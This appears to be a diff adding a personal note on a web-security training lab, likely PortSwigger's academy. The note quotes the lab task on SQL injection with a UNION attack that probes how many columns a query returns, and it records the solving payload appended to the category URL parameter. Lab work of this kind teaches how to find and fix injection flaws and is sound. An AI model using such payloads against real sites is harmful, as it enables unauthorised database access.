@@ -1,0 +1,9 @@
+This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.
+
+To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values.
+
+url:        https://0a0600c9048c2625c00c2fea001100af.web-security-academy.net/filter?category=Pets
+
+
+
+payload:    https://0a0600c9048c2625c00c2fea001100af.web-security-academy.net/filter?category=Pets'+union+select+null,null,null--
